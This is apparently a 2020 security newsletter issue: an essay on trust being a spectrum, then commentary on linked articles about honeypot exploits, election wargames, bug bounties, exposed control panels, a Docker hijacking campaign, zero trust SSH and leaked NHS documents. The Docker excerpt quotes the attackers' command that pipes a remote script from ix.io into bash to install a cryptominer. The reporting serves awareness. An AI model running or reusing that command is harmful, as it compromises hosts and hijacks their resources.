---
title: "102 - Security isn't binary"
date: 2020-05-24
description: "We like to think that things are either secure or insecure, that a person is trusted or not trusted, that someone is an attacker or a defender.  These dualities fill information security and lead us to lazy thinking in lots of ways around security."
permalink: /shades-of-grey/
---

We like to think that things are either secure or insecure, that a person is trusted or not trusted, that someone is an attacker or a defender.  These dualities fill information security and lead us to lazy thinking in lots of ways around security.

Dualism, or black and white thinking [(A term I'm trying to avoid)](https://www.ncsc.gov.uk/blog-post/terminology-its-not-black-and-white) tends to mean that we don't improve security, because it's either secure and doesn't need touching, or it's insecure and there's only one thing we can do, which is to it secure.  Simply improving the security of a thing a little bit doesn't really work in a world of dualities.

Looking at the UK's contract tracing app document sharing thing this week is a good example.  Who should have access to our documents?  It sounds simple right, maybe we just mean our staff versus not-our-staff.  But of course, we employ lots of contractors, are they the same as an employee?  Maybe they should have access to our documents about the products we are building, but should they have unrestrained access to all of our organisations documents?  

Clever people start to talk about access control lists, role based access controls and group membership.  Maybe you share documents with a Google Group, or define access within Sharepoint to an organisational group or unit, and that kind of works, but it only works if you can define identity and access control for your users.  Again, the duality comes in, insiders and outsiders this time.

But not only does my team employ contractors, we have some people from consultancies come and work with me.  Doesn't really matter which ones, any systems integrator or management consultancy will do, lets call them Pac Deloittica.  But those people, should they have access to my documents?  They definitely aren't staff, and they have their own identities within their own corporate structure.  How can I effectively share information with them?  Maybe I issue temporary credentials to them, or maybe I use some fancy federation tools, but now I have different issues.  I might trust Charlotte from Pac Deloittica, but it doesn't mean I trust all 250,000 employees of Pac Deloittica to see my company files.  I may not even trust the system administrators at the consultancy, so I might not want to let them define a group that says who has access.  But the consultancy who sends me a new technical architect to every single meeting, so I don't know whether today I should share my documents with Charlotte, or with Annie, or Brenda, they're all interchangable resources to Pac Deloittica!

And then of course, sometimes the company I'm sharing stuff with needs to reshare it internally, they need to send it to their design authority and their technical advisory board to get comments and views.  How can they do that in a way that maintains the security of the document, that ensures that only the people who are supposed to see it can see it?  

The reality is that most organisations email a copy of the file around, and never know who has it, where it goes, or what happens to it.  In a newer paradigm, we tend to email links around that require someone to authenticate to see the document.  But what happens when those links are shared wider than they should be?

We like to think that the infosec world is simple, that it's a world of dualities where there is trusted and untrusted, but the reality is that the world is a spectrum of trust, a spectrum of security behaviours, awareness, monitoring and capabilities.  When we fool ourselves into thinking this is easy, that's when we get bitten by our assumptions and faulty mental models of the world.

## [Honeysploit: Exploiting the Exploiters - Curtis Brazzell - Medium](https://medium.com/@curtbraz/exploiting-the-exploiters-46fd0d620fd8)

[https://medium.com/@curtbraz/exploiting-the-exploiters-46fd0d620fd8](https://medium.com/@curtbraz/exploiting-the-exploiters-46fd0d620fd8)

> Of all the open-source security tools I execute on a daily basis, PoC exploit code gives me the most hesitation. If I’m being honest, I don’t always fully understand exactly what’s going on behind the scenes in order for an exploit, especially Remote Code Execution (RCE), to work. In most cases there is raw shellcode passed along as part of the payload to establish the reverse bind shell with the client-side script, which can be a little intimidating to look at. The exploit script itself may be written in a language you aren’t as familiar with. (For me that would be Ruby) I was curious how many different types of people use third-party exploit code and how many also don’t inspect the code. Also, would anyone willingly promote it without having to advertise it? I’ve noticed malware and vulnerability researchers are often the first to point out whenever there’s a working PoC for a high profile vulnerability, such as BlueKeep, in recent history. I had always assumed black hats, who make their money on exploitation, must be keeping an proactive eye on these somehow. I wanted to know more and see if there was a teachable moment here for all of us, so I came up with an experiment.


This is just lovely.  By publishing and advertising an exploit proof of concept for a known security vulnerability, Curtis was able to get attackers, both professional security auditors as well as black hat hackers, to download and run his code.  That code of course just captured what the attackers were trying to do.


## [Election security drill pits red-team hackers against DHS, FBI and police](https://www.cyberscoop.com/election-security-exercise-cybereason/)

[https://www.cyberscoop.com/election-security-exercise-cybereason/](https://www.cyberscoop.com/election-security-exercise-cybereason/)

> On Tuesday, executives from the Boston-based firm Cybereason will conduct a tabletop exercise testing the resolve of officials from the Department of Homeland Security, FBI, and the police department of Arlington County, Virginia, among other organizations.
> 
> The fictional scenario will involve attackers from an unnamed foreign adversary laying siege to a key city in a U.S. swing state. Hacking, physical attacks and disinformation via social media will be on the table as the attackers seek to flip the vote to their preferred candidate — or sow enough doubt among voters to undermine the result.
> 
> One of the objectives of the red team — technical specialists from Cybereason and other private organizations — is voter suppression. That is exactly what Russian operatives aimed to achieve in 2016 and what, according to U.S. officials, they could strive for again in 2020.
> 
> What participants learn from Tuesday’s event can be worked into future election-security drills, which will only grow more frequent as the 2020 vote approaches.
> 
> “The idea is to showcase … how things interconnect that you’re not aware of,” Yonatan Striem-Amit, Cybereason’s CTO and co-founder, told CyberScoop. “What happens when you combine a physical threat and a social media campaign at the same time?”


I love a good set of wargaming.  It appeals both to my boardgaming, computer gaming and roleplaying nerd background, but also to my love of addressing the real problems in most incidents, lack of effective communication and collaboration.

Wargaming scenarios allows us to put the people in the room who would have to react in the real scenarios and give them a chance to practice their skills.  Often, not the technical skills or even the incident response strategy.  It's an opportunity to experience the stress, the excitement and the continual information overload that will happen in a real incident.  And of course, since they are there with others involved, they get to practice how to communicate in those situations.  If you've never held the incident commander hat, you'll not know how difficult it is to make decisions without enough information, to give briefings upwards and sideways that you may later have to retract, and to keep on top of all of the moving parts.

Drill, drill, drill, that's how we get to be good at responding to incidents.


## [Ethical hackers find hundreds of vulnerabilities during latest Air Force bug bounty](https://www.fifthdomain.com/2020/04/15/ethical-hackers-find-hundreds-of-vulnerabilities-during-latest-air-force-bug-bounty/)

[https://www.fifthdomain.com/2020/04/15/ethical-hackers-find-hundreds-of-vulnerabilities-during-latest-air-force-bug-bounty/](https://www.fifthdomain.com/2020/04/15/ethical-hackers-find-hundreds-of-vulnerabilities-during-latest-air-force-bug-bounty/)

> Through “Hack the Air Force 4.0,” which ran from Oct. 23 to Nov. 20, 60 security researchers searched for vulnerabilities in an Air Force virtual data center. They ultimately earned a total of $290,000, the highest total given out through its bug bounty program so far.
> 
> At the in-person event, hackers could search for loopholes in a “specific asset” from the U.K. Ministry of Defence, the release said. The event “gave hackers the opportunity to collaborate with peers and military personnel to discover vulnerabilities," according to HackerOne.
> 
> "The U.S. Air Force provides an example of the proven impact of collaborating with hackers to bolster security,” said Jon Bottarini, federal technical program manager lead at HackerOne. “Through Defense Digital Service, the DoD has established an expansive and powerful approach to cybersecurity today, and we look forward to bringing this new challenge to the hacker community up for the task.”


These are all vulnerabilities that may have been found only once these assets were deployed and in use. 

Of course, a bug bounty and vulnerability research program is only as good as the organisations remediation capability.  We can only hope that the suppliers and organisations involved are able to fix all of these issues before deploying the systems.


## [Lights That Warn Planes of Obstacles Were Exposed to Open Internet - VICE](https://www.vice.com/en_us/article/7x5nkg/airplane-warning-lights-hacked)

[https://www.vice.com/en_us/article/7x5nkg/airplane-warning-lights-hacked](https://www.vice.com/en_us/article/7x5nkg/airplane-warning-lights-hacked)

> The issue was with "obstruction lighting" designed to alert aircraft to obstacles. Dan found at least 46 control panels online for light systems, including in Baltimore; Tuscola, IL; Decatur, TX; as well as Ontario in Canada, according to a list of IP addresses and other details he provided to Motherboard. The names of the systems' locations suggest some of the systems could have controlled lighting on tall cell phone towers.
> 
> One panel Dan showed Motherboard included controls such as "Force Day, "Force Twilight," and "Force Night."


Scanning for systems online seems like it would be the worlds most depressing job.  You just keep running into these things, whether it be CCTV system, databases of people's identities or lighting control systems.

It's easy to say that these systems shouldn't be online, but the actual issue here for me is that these systems have little to no authentication on them.  It's not like we can go around telling people the wonders of a second factor in authentication if they aren't even bothering with a first factor!


## [A hacking group is hijacking Docker systems with exposed API endpoints | ZDNet](https://www.zdnet.com/article/a-hacking-group-is-hijacking-docker-systems-with-exposed-api-endpoints/)

[https://www.zdnet.com/article/a-hacking-group-is-hijacking-docker-systems-with-exposed-api-endpoints/](https://www.zdnet.com/article/a-hacking-group-is-hijacking-docker-systems-with-exposed-api-endpoints/)

> What we know so far is that the group behind these attacks is currently scanning more than 59,000 IP networks (netblocks) looking for exposed Docker instances.
> 
> Once the group identifies an exposed host, attackers use the API endpoint to start an Alpine Linux OS container where they run the following command:
> 
> chroot /mnt /bin/sh -c 'curl -sL4 http://ix.io/1XQa | bash;
> 
> The above command downloads and runs a Bash script from the attackers' server. This script installs a classic XMRRig cryptocurrency miner. In the two days since this campaign has been active, hackers have already mined 14.82 Monero coins (XMR), worth just over $740, Mursch noted.


An older article, but one that shows that attackers are happy to move techniques on how they compromise systems, but their goals tend to remain the same.  If your docker instances got taken over, there's probably lots of damaging things those attackers could do, that would completely destroy your business and your commercial reputation.  But they just want to mine cryptocurrency using your power and credit card bills.


## [Digital Public Assets: Rethinking value, access and control of public sector data in the platform age](https://common-wealth.co.uk/digital-public-assets.html)

[https://common-wealth.co.uk/digital-public-assets.html](https://common-wealth.co.uk/digital-public-assets.html)

> The expansive data produced by the public sector, which includes health, meteorological and fiscal information, has not been immune to the transformation of the state over the past few decades. But the opening up of government datasets to commercial actors and the implications of this for the public sector and society more widely have been largely overlooked. Government, industry and civil society bodies, often under the banner of “open government data” (OGD) campaigns, have long advocated unrestricted and free access to public sector information, hailing it as indispensable for government accountability and digital innovation, among other causes. And while the democratic claims of certain groups advocating OGD are unquestionably important, the political economies of the public sector and of digital infrastructure over recent decades require us to consider whether the existing structures for accessing publicly-held data are the most appropriate for harnessing common wealth, collective ownership and public good.


This call for certain digital datasets to be maintained in the open as a  central public good is an interesting one.

If you believe that companies are able to take public assets, combine them or use them in ways that enable them to generate more wealth for the country then you'll probably believe that this is a good thing.  But there's a significant difference between physical assets, such as common land, and digital assets.

On the positive side, digital assets are never diminished for being used.  Just because a navigation application is using geographic data doesn't mean that public garden finder app can't also use the same data.  This multiplicative effect means that even small well curated datasets can have huge impacts elsewhere.

But on the negative side, there is far less connection with the owner and generator of a digital asset.  If I raise my cows on common pasture ground, then there's a limit to how far I can take them for slaughter, how far I can ship the finished goods, and of course, I likely live near the common ground and spend my profits in the local community.  But with a digital asset, the person making money off of the asset may well live in another country, and be ploughing their money into that area instead.  Digital assets don't obey country borders, and while we all benefit if the global economy is highly effective, we don't have the same economic relationships with all countries.  What if the people using and profiting from the open data are from a country which is, either economically, culturally or physically at war with us?


## [Applying the Principles of Zero Trust to SSH](https://gravitational.com/blog/applying-principles-of-zero-trust-to-ssh/)

[https://gravitational.com/blog/applying-principles-of-zero-trust-to-ssh/](https://gravitational.com/blog/applying-principles-of-zero-trust-to-ssh/)

> Instead of SSH keys, Teleport acts as a certificate authority that applies your role-based access control for a designated time period. Roles are confirmed for each user session so there are no old authorizations sitting around that no longer apply. Roles are also applicable to particular clusters - useful when there are often different authorization levels across systems.
> 
> An organization that has a large amount of traditional SSH key usage with multiple different roles should expect to iterate to achieve Zero Trust. Before defining too many roles that are overly coarse or fine-grained, it’s best to try them out. Confirm that the user can still perform their business functions while there are approval requests in place for modifying resources. Having a deadline to achieve Zero Trust vs. never letting go of static credentials is best to fully embrace the approach.


Theres a lot of nice things in this implementation, but this stood out to me.

Organisations moving to Zero Trust should iterate, slowly towards it.  And you might look at the new first step model and say "that's not as secure as it could be, we just give all our staff the same role", but don't let that stop you. It might not be good security, but it's likely better than you already have.

I think the move from SSH keys on devices to certificates, and in particular short lived certificates is a significant step up in SSH security, even if you change nothing else.  Right now, stealing the SSH keys from someone's devices isn't terribly hard, and almost certainly gives me long term persistent access.


## [Commonwealth Bank CTO details how crap data, legacy can kill you - Finance - Cloud - Software - Storage - iTnews](https://www.itnews.com.au/news/commonwealth-bank-cto-details-how-crap-data-legacy-can-kill-you-533998)

[https://www.itnews.com.au/news/commonwealth-bank-cto-details-how-crap-data-legacy-can-kill-you-533998](https://www.itnews.com.au/news/commonwealth-bank-cto-details-how-crap-data-legacy-can-kill-you-533998)

> A root cause of the current pain is that as the upside of big data and analytics became obvious, there was a buying binge without addressing some foundation issues.
> 
> “We built data lakes. We built big warehouses. We bought appliances from vendors ... I know some of you are in here, we saw you before... We bought storage. We bought as much software as we could buy, and we employed data scientists, tens of them, and hundreds of them. we spent hundreds of millions of dollars,” Pancino said.
> 
> “But my question is, did we take enough time to understand that the data we were pumping into the lakes and all of the warehouses came from our core systems, our legacy platforms our heterogeneous capabilities. Did we understand where the data was taken from? Did we understand who was collecting it? Was it accurate?...”. Pancino’s list goes on.
> 
> “You'd have to argue that we didn't. Because when the crisis hit, you're into this strange situation where data in the enterprise in the IT systems is still hard to wrangle, and yet we've spent millions of dollars,” he says.


Legacy IT is the biggest threat to Government and many other sectors.  But there's often a misunderstanding about what actually makes something legacy.  Being old isn't the problem at all, it's resistance to change that will kill you. 

I've seen highly efficient and easy to change mainframes fronted by 90s era java enterprise applications where the java system is far more resistant to change and far more "legacy" than the mainframe behind it.  Sure skills and hardware support are issues with much older technology, and we need to do something about that, but often we need to look more closely at what our solutions are.

If you are building a next generation system in 2019, you probably didn't predict the change in connectivity, in demand, in systems that Covid-19 has put on workplaces.  If your "next generation system" wasn't easy to change, then it's not the future, it's simply tomorrows legacy being built today.


## [Google Is Letting People Find Invites to Some Private WhatsApp Groups | Vice](https://www.vice.com/en_us/article/k7enqn/google-is-letting-people-find-invites-to-some-private-whatsapp-groups)

[https://www.vice.com/en_us/article/k7enqn/google-is-letting-people-find-invites-to-some-private-whatsapp-groups](https://www.vice.com/en_us/article/k7enqn/google-is-letting-people-find-invites-to-some-private-whatsapp-groups)

> Danny Sullivan, Google's public search liaison, tweeted "Search engines like Google & others list pages from the open web. That’s what’s happening here. It’s no different than any case where a site allows URLs to be publicly listed. We do offer tools allowing sites to block content being listed in our results."
> 
> A WhatsApp spokesperson said in a statement, "Group admins in WhatsApp groups are able to invite any WhatsApp user to join that group by sharing a link that they have generated. Like all content that is shared in searchable, public channels, invite links that are posted publicly on the internet can be found by other WhatsApp users. Links that users wish to share privately with people they know and trust should not be posted on a publicly accessible website."


(Joel) My first reaction was "well, yes, duh". If you take something that confers access (in this case, a WhatsApp group invite sharing link) and put it somewhere public it is probable that someone else (human or machine) will read it. Machines might make it accessible to even more humans. A human then might click it.

There is a lot to be said about who uses WhatsApp and the idea that a phone number (which you may no longer own, as if you change SIM/number WhatsApp will let you keep using your old one) is your identity (that said, I'd take phone number over anonymous email address).

(Psst, if you use WhatsApp, thats totally cool... and you should enable two factor / step verification [https://faq.whatsapp.com/en/android/26000021]) 


## [Secret NHS files reveal plans for coronavirus contact tracing app | WIRED UK](https://www.wired.co.uk/article/nhs-covid-19-app-health-status-future)

[https://www.wired.co.uk/article/nhs-covid-19-app-health-status-future](https://www.wired.co.uk/article/nhs-covid-19-app-health-status-future)

> One document titled ‘Product Direction: Release One’ and marked as ‘OFFICIAL – SENSITIVE’, includes a series of slides showing the app’s future development roadmap. The documents also reveal that officials within the NHS and Department of Health and Social Care are worried that the app’s reliance on unverified diagnoses could be open to abuse and lead to “public panic” that puts extra pressure on the health service.
> 
> 
> The documents, which are hosted in Google Drive, were inadvertently left open for anyone with a link to view. Links to the documents were included in others published by the NHS covering the privacy protections in the contact tracing app. Other documents linked to in the document could not be accessed without approval.
> 
> The documents, hosted on Google Drive, were accessible through others published alongside the app’s Data Privacy Impact Assessment. The vast majority of the documents linked to are not public – they require being logged in with an account that has permission to view the document. However, a small number could be viewed anonymously by anyone with access to a link.


I've read many a draft product roadmap that has ridiculous ideas in it.  The reason is that often, when you are going out to your stakeholders, users and bosses to determine what you should do next, if you go with a blank piece of paper, you don't get useful feedback.  But if you take a strawman, you get lots of pushback, people tell you what they'd rather see, or you sometimes hit a nerve and people grab you and tell you it's amazing (Ok, I lie, I've never had that last one).  Reading such a document without context is only going to cause teams issues.

However, I'm less interested in the furore over the contract tracing debate (too close to my actual work, and I know too many people involved to feel like commenting is safe), than I am over what this tells me about the ability of teams to collaborate.

The contact tracing app, and the teams building it has been an amazing piece of work by a set of people drawn from across government, academia and industry.  But there's very little you can do, if you bring a team like that together fast, to enable them to collaborate effectively, easily and securely.  Google Docs allows you to specifically invite people to edit a document by google account, but not everybody has a google account, and they make need to take the document and reflect it internally.  So of course, the sensible option is to allow link sharing.  Anyone who has the URL can access the document.  

In reality, link sharing is generally secure, safe and the right thing to do in these occasions... unless the link gets exposed somewhere.  Even more annoying, Google has no way to generate a new link for a document, so if your link gets exposed, you either shut down collaboration, or you put up with the exposure.

The failure here is that a public document was sent out with links embedded in it that were either inaccessible to the public (and therefore pointless) or a public release of non-public data.  These links should never have been retained in the DPIA document that went out.  That's the issue here rather than the fact that possession of the link allows anyone to access it.


